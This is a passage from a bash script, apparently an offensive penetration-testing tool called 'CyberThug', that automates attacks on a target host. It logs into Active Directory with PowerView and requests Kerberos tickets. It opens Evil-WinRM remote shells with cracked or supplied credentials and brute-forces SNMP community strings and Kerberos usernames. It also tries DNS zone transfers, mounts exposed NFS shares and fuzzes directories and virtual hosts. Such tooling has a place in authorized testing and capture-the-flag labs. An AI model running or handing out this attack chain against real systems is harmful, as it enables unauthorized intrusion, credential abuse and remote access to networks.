spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Ip: \$Ip\e[0m'

echo -e '\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m'
echo ''
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\" 

if [ \$? -ne 1 ]; then
    echo ''
    echo -e '\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m'
    echo ''
    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo ''

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
        echo ''
	echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
        echo ''   
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 1 ]; then
            echo ''
            echo -e '\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m'
            echo ''
        fi
    else
        echo -e '\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m'
        echo ''
    fi
fi

exec bash\"
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"
}

network(){
echo ""
echo -e "\e[1;35m--------------- [+] NETWORK [+] ---------------\e[0m"
echo ""
if [ "$flag_4" = true ]
then
    :
else 
    if nc -zv -w 5 $DOMAIN 21 2>/dev/null; then
              echo -e "\e[1;32m[+]-- FTP Enumeration on $DOMAIN --[+]\e[0m"
              echo ""
              ftp -n $DOMAIN <<END_SCRIPT
user Anonymous Anonymous
ls        
bye
END_SCRIPT
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 25 2>/dev/null || nc -zv -w 5 $DOMAIN 587 2>/dev/null; then
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- SMTP Enumeration on $DOMAIN --[+]\e[0m' ; echo "" ; smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt $DOMAIN 25 ; exec bash" 
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 53 2>/dev/null || nc -zuv -w 5 $DOMAIN 53 2>/dev/null; then
       ip=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
       mkdir -p "$HOME/CyberThug_output/dnsenum"
       Time=$(date +"%Y-%m-%d_%H-%M-%S")
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- DNS Enumeration on $DOMAIN --[+]\e[0m' ; echo "" ; dig @$ip $DOMAIN ; echo "" ; echo -e '\e[1;32m---------------\e[0m' ; echo "" ; dig axfr @$ip $DOMAIN ; echo "" ;echo -e '\e[1;32m---------------\e[0m' ; echo "" ; dnsenum --dnsserver $ip -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o $HOME/CyberThug_output/dnsenum/dns_enum_${DOMAIN}_${Time} $DOMAIN ; echo "" ; echo -e '\e[1;32m[+]-- Output File : $HOME/CyberThug_output/dnsenum/dns_enum_${DOMAIN}_${Time} --[+]\e[0m' ; exec bash"
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 111 2>/dev/null || nc -zv -w 5 $DOMAIN 2049 2>/dev/null; then
       output=$(timeout 10s showmount -e $DOMAIN 2>&1)
       line_count=$(echo "$output" | wc -l)
       if [ $line_count -gt 1 ]; then
gnome-terminal -- bash -c "
echo -e '\e[1;32m[+]-- NFS Enumeration on $DOMAIN --[+]\e[0m'
echo ''
showmount -e $DOMAIN
echo ''
echo '--------------------------'
exports=\$(showmount -e $DOMAIN | grep '^/' | awk '{print \$1}' | paste -sd ' ' -)
echo ''
if [ -n \"\$exports\" ]; then
    for export in \$exports; do
        mkdir -p /tmp/nfs\$export
        echo -e '\e[1;32m[+]-- Mount in /tmp/nfs --[+]\e[0m'
        echo ''
        sudo mount -t nfs $DOMAIN:\$export /tmp/nfs\$export 2>/dev/null
        echo ''
        if [ ! -d \"\/tmp/nfs/$export\" ]; then
            echo -e '\e[1;32m[*] \"'\$export'\" Mounted Successfully ...\e[0m'
        else
            echo -e '\e[1;32m[*] Failed to mount \"'\$export'\" \e[0m' 
        fi
        echo '' 
    done
fi
cd /tmp/nfs
exec bash"
       else
           :
       fi
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 139 2>/dev/null || nc -zv -w 5 $DOMAIN 445 2>/dev/null; then
       echo ""
       echo -e "\e[1;32m[+]-- Enum4Linux on $DOMAIN --[+]\e[0m"
       echo ""
       enum4linux $DOMAIN
       echo -e "\e[1;32m[+]-- LookupSID on $DOMAIN --[+]\e[0m"
       echo ""
       lookupsid.py -no-pass guest@$DOMAIN 20000
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 161 2>/dev/null || nc -zvu -w 5 $DOMAIN 161 2>/dev/null; then
        gnome-terminal -- bash -c "
        echo -e '\e[1;32m[+]-- SNMP Enumeration on $DOMAIN --[+]\e[0m'
        echo ''
        wordlist='/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt'
        for comm in \$(cat \"\$wordlist\"); do
            echo -e '\e[1;35m-----[+] Testing community string: '\$comm'  [+]-----\e[0m'
            timeout 2s snmpwalk -v 2c -c \"\$comm\" \"$DOMAIN\" || echo -e '\e[1;38m--------------------\e[0m'
            timeout 2s snmpwalk -v 1 -c \"\$comm\" \"$DOMAIN\"
            echo -e '\e[1;31m[+] Commands => snmpwalk -v 2c -c '\$comm' $DOMAIN -m all || snmpwalk -v 1 -c '\$comm' $DOMAIN -m all [+]\e[0m'
            echo ''
        done
        exec bash"
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 389 2>/dev/null || nc -zv -w 5 $DOMAIN 636 2>/dev/null; then
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Windsearch on $DOMAIN --[+]\e[0m' ; echo "" ; python3 $HOME/Downloads/tools/Folders/Windapsearch/windapsearch.py -U --full --dc-ip $DOMAIN ; exec bash"         
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 6379 2>/dev/null || nc -zvu -w 5 $DOMAIN 6379 2>/dev/null; then
        gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Redis-Cli on $DOMAIN --[+]\e[0m' ; echo "" ; redis-cli -h $DOMAIN ; exec bash"         
    fi 
    echo "--------------------------"
    if nc -zuv -w 5 $DOMAIN 69 2>/dev/null; then
        gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TFTP on $DOMAIN --[+]\e[0m' ; echo "" ; tftp $DOMAIN ; exec bash"
    fi
    echo "--------------------------" 
    if nc -zv -w 5 $DOMAIN 88 2>/dev/null; then
       echo ""
       echo -e "\e[1;32m[+]-- Kerbrute on $DOMAIN --[+]\e[0m"
       echo ""
       if  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $HOSTS_ENTRY /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
       then
           :
       elif  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
       then
           :
       else
             $HOME/Downloads/tools/Files/Kerbrute userenum -d $HOSTS_ENTRY --dc $HOSTS_ENTRY /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
       fi
    fi
fi
}
web_2(){
  PROTOCOL=$1
  FULL_DOMAIN="$PROTOCOL://$DOMAIN"
  echo -e "                                     \e[1;37m[+]----- Scanning $FULL_DOMAIN -----[+]\e[0m"
  echo "" 
gnome-terminal -- bash -c "
gnome-terminal -- bash -c '
echo -e \"\e[1;32m[+]-- Nikto on $FULL_DOMAIN --[+]\e[0m\";
echo ""
nikto -h $FULL_DOMAIN -C all 
exec bash'
echo -e '\e[1;32m[+]-- Nuclei on $FULL_DOMAIN --[+]\e[0m';
nuclei -u $FULL_DOMAIN -severity info,low,medium,high,critical -rate-limit 50 -c 50 -mhe 5 -t $HOME/nuclei-templates
exec bash" 

ip=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
  if [[ ! $DOMAIN =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
     if [ -z "$HOSTS_ENTRY" ]; then
          echo -e "dasdddd445ddddda445sd\ndasdsada4sdsdasd54654\ndsdasdd45d4a5sd4as5d4\n5445dasd4554dasd45ddd\n455ddasd5512das2da2d2\ndasdas5d5asd5asd5asd4\ndas5das5d4as5d4asd5as\nds5d5454das5d4a5d12dd\ndasd554d21d2ad8dadada\ndadadasd545d45ad4sd5s\ndasd4a5d4a5sdas5d4a5d\nd5asd4a5d4as5d4sd55dd\nda5sdas4da5d4as5dad54\nda5d454d45da45das4ddd\ndas5d4ad54as5da4dasdd\nda5d4a5d4a4dad54ds4dd\nd5ad4a5ds5d4dsd4s4dd5\n4d5ad4a5d4a5d4d5d455d\nadasdadasd45ad4a5s4dd\nd5sd4ad5a4da5d45dd4dd\nd5ad4a5d4as5das4d5ddd" > $HOME/CyberThug_output/.test.txt
          ffuf -w $HOME/CyberThug_output/.test.txt -u $PROTOCOL://$ip -H "Host: FUZZ.${DOMAIN}" >> $HOME/CyberThug_output/.test1.txt
          echo ""
          file="$HOME/CyberThug_output/.test1.txt"
          while IFS= read -r line; do
                if echo "$line" | grep -q "Size"; then
                    size=$(echo "$line" | sed -n 's/.*Size: \([0-9]\+\),.*/\1/p')
                fi
          done < "$file"
          sleep 2
          if [ -n "$size" ]; then
gnome-terminal -- bash -c "
echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via VHOST --[+]\e[0m\"
echo \"\"

if [[ ! \"$DOMAIN\" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    gnome-terminal -- bash -c '
    echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via DNS --[+]\e[0m\"
    echo \"\"
    gobuster dns -d $DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    exec bash'
fi

ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u ${PROTOCOL}://${ip} -H \"Host: FUZZ.${DOMAIN}\" -fc 404 -fs ${size} -c
exec bash
"
          else
gnome-terminal -- bash -c "
echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via VHOST --[+]\e[0m\"
echo \"\"

if [[ ! \"$DOMAIN\" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    gnome-terminal -- bash -c '
    echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via DNS --[+]\e[0m\"
    echo \"\"
    gobuster dns -d $DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    exec bash'
fi

ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u ${PROTOCOL}://${ip} -H \"Host: FUZZ.${DOMAIN}\" -fc 404 -fs ${size} -c
exec bash
"
          fi
     else 
          echo -e "dasdddd445ddddda445sd\ndasdsada4sdsdasd54654\ndsdasdd45d4a5sd4as5d4\n5445dasd4554dasd45ddd\n455ddasd5512das2da2d2\ndasdas5d5asd5asd5asd4\ndas5das5d4as5d4asd5as\nds5d5454das5d4a5d12dd\ndasd554d21d2ad8dadada\ndadadasd545d45ad4sd5s\ndasd4a5d4a5sdas5d4a5d\nd5asd4a5d4as5d4sd55dd\nda5sdas4da5d4as5dad54\nda5d454d45da45das4ddd\ndas5d4ad54as5da4dasdd\nda5d4a5d4a4dad54ds4dd\nd5ad4a5ds5d4dsd4s4dd5\n4d5ad4a5d4a5d4d5d455d\nadasdadasd45ad4a5s4dd\nd5sd4ad5a4da5d45dd4dd\nd5ad4a5d4as5das4d5ddd" > $HOME/CyberThug_output/.test.txt
          ffuf -w $HOME/CyberThug_output/.test.txt -u $PROTOCOL://$ip -H "Host: FUZZ.${DOMAIN}" >> $HOME/CyberThug_output/.test1.txt  
          echo ""
          file="$HOME/CyberThug_output/.test1.txt" 
          while IFS= read -r line; do
                if echo "$line" | grep -q "Size"; then
                   size=$(echo "$line" | sed -n 's/.*Size: \([0-9]\+\),.*/\1/p')
                fi
          done < "$file"
          sleep 2
          if [ -n "$size" ]; then
gnome-terminal -- bash -c "
echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via VHOST --[+]\e[0m\"
echo \"\"

if [[ ! \"$DOMAIN\" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    gnome-terminal -- bash -c '
    echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via DNS --[+]\e[0m\"
    echo \"\"
    gobuster dns -d $DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    exec bash'
fi

ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u ${PROTOCOL}://${ip} -H \"Host: FUZZ.${DOMAIN}\" -fc 404 -fs ${size} -c
exec bash
"
          else
gnome-terminal -- bash -c "
echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via VHOST --[+]\e[0m\"
echo \"\"

if [[ ! \"$DOMAIN\" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    gnome-terminal -- bash -c '
    echo -e \"\e[1;32m[+]-- Subdomain Enumeration on $DOMAIN via DNS --[+]\e[0m\"
    echo \"\"
    gobuster dns -d $DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    exec bash'
fi

ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u ${PROTOCOL}://${ip} -H \"Host: FUZZ.${DOMAIN}\" -fc 404 -fs ${size} -c
exec bash
"
          fi
     fi 
  fi
  TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
  SANITIZED_DOMAIN=$(echo "$FULL_DOMAIN" | sed 's~://~_~')
  OUTPUT_DIR="$HOME/CyberThug_output/GitDumper/git_${TIMESTAMP}_${SANITIZED_DOMAIN}"
  mkdir -p "$OUTPUT_DIR"
  echo -e "\e[1;32m[+]-- GitDumper on $FULL_DOMAIN --[+]\e[0m"
  echo -e ""
  $HOME/Downloads/tools/Files/Gitdumper.sh "$FULL_DOMAIN/.git/" "$OUTPUT_DIR"
  echo ""
  echo -e "\e[33m[*] Destination folder does not exist\e[0m" 
  echo -e "\033[32m[+] Creating $OUTPUT_DIR/Extractor\033[0m"
  $HOME/Downloads/tools/Files/Extractor.sh "$OUTPUT_DIR" "$OUTPUT_DIR/Extractor"
  echo "--------------------------"
  echo -e "\e[1;32m[+]-- Ds_Walk on $FULL_DOMAIN --[+]\e[0m"
  echo "" 
  python $HOME/Downloads/tools/Folders/DS_Walk/ds_walk.py -u $FULL_DOMAIN 
  echo "--------------------------"
  echo -e "\e[1;32m[+]-- Page Source Domains on $FULL_DOMAIN --[+]\e[0m"
  echo "" 
  curl -L $FULL_DOMAIN -k | grep -oE '\b[a-zA-Z0-9._-]+\.(htb|thm|com|org|net|edu|gov|mil|int|co|us|uk|ca|de|jp|fr|au|eg|local)\b'
  echo "--------------------------"
gnome-terminal -- bash -c "
gnome-terminal -- bash -c '
echo -e \"\e[1;32m[+]-- Running Dirsearch on $DOMAIN --[+]\e[0m\";
echo ""
dirsearch -u $FULL_DOMAIN -r --random-agent --exclude-status 404 
exec bash'
echo -e '\e[1;32m[+]-- Running Feroxbuster on $DOMAIN --[+]\e[0m';
feroxbuster --url $FULL_DOMAIN --random-agent --filter-status 404 -k
exec bash"
  echo "--------------------------"
  sleep 2
gnome-terminal -- bash -c "
echo -e '\e[1;32m[+]-- Running Gobuster with rockyou.txt on $DOMAIN --[+]\e[0m';
echo ""
sleep 2;

gnome-terminal -- bash -c '
echo -e \"\e[1;32m[+]-- Running Gobuster with directory-list-2.3-medium.txt on $DOMAIN --[+]\e[0m\";
echo ""
STATUS_CODES=(\"\" \"-k -b 404\" \"-k -b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300,502\" \"-k -b 200\")

for CODE in \"\${STATUS_CODES[@]}\"
do
    gobuster dir -u $FULL_DOMAIN -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$CODE --random-agent 
    if [[ \$? -eq 0 ]]; then break; fi
done
exec bash
' &

STATUS_CODES=(\"\" \"-k -b 404\" \"-k -b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300,502\" \"-k -b 200\")

for CODE in \"\${STATUS_CODES[@]}\"
do
    gobuster dir -u $FULL_DOMAIN -w /usr/share/wordlists/rockyou.txt --no-error --exclude-length 0 \$CODE --random-agent
    if [[ \$? -eq 0 ]]; then break; fi
done

exec bash
"
  echo "--------------------------"
  sleep 2
gnome-terminal -- bash -c "
echo -e '\e[1;32m[+]-- WPscan on $FULL_DOMAIN --[+]\e[0m';
echo "" ;
wpscan --url $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update;
wpscan --url $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update --enumerate u;
wpscan --url $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update -e p --plugins-detection aggressive;
gnome-terminal -- bash -c \"echo -e '\e[1;34m[+]-- Droopescan on $FULL_DOMAIN --[+]\e[0m' ; echo "" ; droopescan scan drupal -u $FULL_DOMAIN ; exec bash\";
gnome-terminal -- bash -c \"joomscan -u $FULL_DOMAIN ; echo "" ; echo -e '\e[1;35m[+]-- JoomScan on $FULL_DOMAIN --[+]\e[0m' ; exec bash\";
exec bash"

}
web_1(){
   echo ""
   if [ "$flag_3" = true ]
   then
       :
   else
       echo -e "\e[1;35m---------------[+] RECON [+] ---------------\e[0m"
       echo ""
   fi
   echo -e "\e[1;35m--------------- [+] WEB [+] ---------------\e[0m"
   echo ""
   HTTP_OPEN=false
   HTTPS_OPEN=false
   if nc -zv -w 5 $DOMAIN 80 2>/dev/null; then
       HTTP_OPEN=true
   fi
   if nc -zv -w 5 $DOMAIN 443 2>/dev/null; then
      HTTPS_OPEN=true
   fi
   if [ "$HTTP_OPEN" = true ]; then
       if [ "$flag_1" = true ]
          then
              :  
          else
              web_2 "http"
       fi
   fi  
   if [ "$HTTPS_OPEN" = true ]; then
       if [ "$flag_2" = true ]
          then
              :  
          else
              web_2 "https"
       fi
   fi  
gnome-terminal -- bash -c ' 
echo -e "\e[1;32m[+]-- Checking The Common Web Ports to run Gobuster --[+]\e[0m" ;
echo ""
DOMAIN='"$DOMAIN"'
WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
PORTS=(8080 8000 8443 8888 3000 5000 9000 1337 31337)
STATUS_CODES=("" "-b 404" "-b 404,429" "-b 404,429,301" "-k -b 301,404,429,403" "-k -b 301,404,403,300,429" "-k -b 301,302,404,403,401,429,300,502" "-k -b 200")

check_and_run() {
    local PORT=$1
    if nc -zv -w 5 "$DOMAIN" "$PORT" 2>/dev/null; then
        echo "[+] Port $PORT is open"
        echo "[+] Launching Gobuster ... "
        echo -n | openssl s_client -connect "$DOMAIN:$PORT" > /dev/null 2>&1
        if [ $? -eq 0 ]; then PROTO="https"; else PROTO="http"; fi

        gnome-terminal -- bash -c "
PROTO=\"$PROTO\"
DOMAIN=\"$DOMAIN\"
PORT=\"$PORT\"
WORDLIST=\"$WORDLIST\"
STATUS_CODES=(\"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\")
echo -e \"\e[1;32m[+]-- Gobuster on $DOMAIN:$PORT --[+]\e[0m\"
echo ""
for STATUS_CODE in \"\${STATUS_CODES[@]}\"
do 
  gobuster dir -u \"\$PROTO://\$DOMAIN:\$PORT\" -w \"\$WORDLIST\" --no-error --exclude-length 0 \$STATUS_CODE --random-agent
  if [ \$? -eq 0 ]; then break; fi
done
exec bash"
    else
        echo "[-] Port $PORT is closed or unreachable"
    fi
    echo "--------------------------"
}

for PORT in "${PORTS[@]}"; do
    check_and_run "$PORT"
done

exec bash'

}
main(){
     if [ "$flag_5" = true ];
     then
        if [ "$flag_6" = true ];
        then
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
            web_1 
            network 
        else
            nmap -A -vv -Pn $DOMAIN
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
            web_1   
            network 
        fi
     else
         if ping -c3 $DOMAIN 2>/dev/null; then
            if [ "$flag_6" = true ];
            then 
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
                web_1  
                network  
            else
                nmap -A -vv -Pn $DOMAIN
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
                web_1   
                network 
            fi 
         else
            echo -e "\e[1;36m[+]--- Second Attempt ---[+]\e[0m"
            echo ""
            if ping -c25 $DOMAIN 2>/dev/null; then
               if [ "$flag_6" = true ]; then
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
                  web_1  
                  network 
               else
                  nmap -A -vv -Pn $DOMAIN
gnome-terminal -- bash -c "
  echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m';
  gnome-terminal -- bash -c \"echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo ''; nmap $DOMAIN -Pn -sU -T5 -vv ; exec bash\";
  echo '';
  nmap $DOMAIN -Pn -p- -T5 -vv ;
  exec bash"
                  web_1     
                  network 
               fi
            else
                echo -e "\e[1;31m[+]--- The Target Is Not Reachable ---[+]\e[0m"
                exit 1
            fi
         fi
     fi 
}
help(){
echo "
╔════════════════════════════════════════════════════╗
║                ⚡ CyberThug ⚡                     ║
╚════════════════════════════════════════════════════╝

Usage: 
    cyberthug [ip] [domain] flags
    cyberthug [ip] flags
    cyberthug [domain] flags
    cyberthug flags 

Flags:
    --no-http: skip port 80 
    --no-https: skip port 443  
    --no-recon: skip recon 
    --no-network: skip network 
    --no-ping: skip ping 
    --no-portscan: skip port scanning 
    --creds: provide credentials
    -h [help] : display this help menu 
    -t [tool] : Use a specific tool
    -s [search] : Search for a tool by name or keyword and display its usage
"
}
tools(){
  echo -e "\e[1;36m
     ╔════════════════════════════════════════════════════╗
     ║                ⚡ CyberThug ⚡                     ║
     ╚════════════════════════════════════════════════════╝
  \e[0m" 
  case "${1,,}" in
     "" )
     tool_found=true
          echo -e "\e[1;35m[!] Enter an Existing Tool\e[0m"
          echo -e "\e[1;35m
          - nxc
          - GetNPUsers.py
          - GetUserSPNs.py
 	  - getTGT.py
          - username-anarchy
          \e[0m"
     ;;
  esac
  case "${1,,}" in
     user | username | username-anarchy )
     tool_found=true
       echo -e "\e[1;35m
 _   _ ___  ___ _ __ _ __   __ _ _ __ ___   ___            ____ ___    __ _ _ __ ___| |__  _   _
| | | / __|/ _ \  __|  _ \ / _  |  _   _ \ / _ \  _____   / _  |  _ \ / _  | '__/ __|  _ \| | | |
| |_| \__ \  __/ |  | | | | (_| | | | | | |  __/ |_____| | (_| | | | | (_| | | | (__| | | | |_| |
